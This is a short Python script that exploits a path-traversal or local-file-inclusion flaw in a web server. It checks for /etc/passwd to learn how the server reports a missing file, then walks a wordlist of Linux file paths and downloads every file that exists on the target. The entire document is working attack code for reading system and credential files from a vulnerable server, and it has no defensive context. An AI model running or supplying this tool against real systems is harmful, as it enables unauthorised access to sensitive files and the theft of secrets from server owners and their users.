import os
import requests
import sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} PATH-TRAVERSAL-URL")
    exit(1)

url = sys.argv[1]

def find_error_mode(url :str):
    error_1 = requests.get(url + "/this/not/exists_1")
    error_2 = requests.get(url + "/this/not/exists_2")
    success_1 = requests.get(url + "/etc/passwd")
    if error_1.status_code == error_2.status_code != success_1.status_code:
        return {"mode": "status_code", "fail": error_1.status_code}
    else:
        return {"mode": "context", "fail": error_1.text}

def download_file(url: str, file_name :str):
    r = requests.get(url)
    os.makedirs(os.path.dirname(file_name), exist_ok=True)
    with open(file_name, 'wb') as f: 
        f.write(r.content)

def check_file(url: str, error_mode :dict):
    with open("./lfi-linux-list.txt") as f:
        for line in f.readlines():
            r = requests.get(url + line.strip())
            if error_mode['mode'] == "status_code":
                if r.status_code != error_mode['fail']:
                    print(f"[+] Downloading file --> {line.strip()}")
                    download_file(url + line.strip(), "." + line.strip())
            if error_mode['mode'] == "context":
                if r.text != error_mode['fail']:
                    print(f"[+] Downloading file --> {line.strip()}")
                    download_file(url + line.strip(), "." + line.strip())

check_file(url, find_error_mode(url))
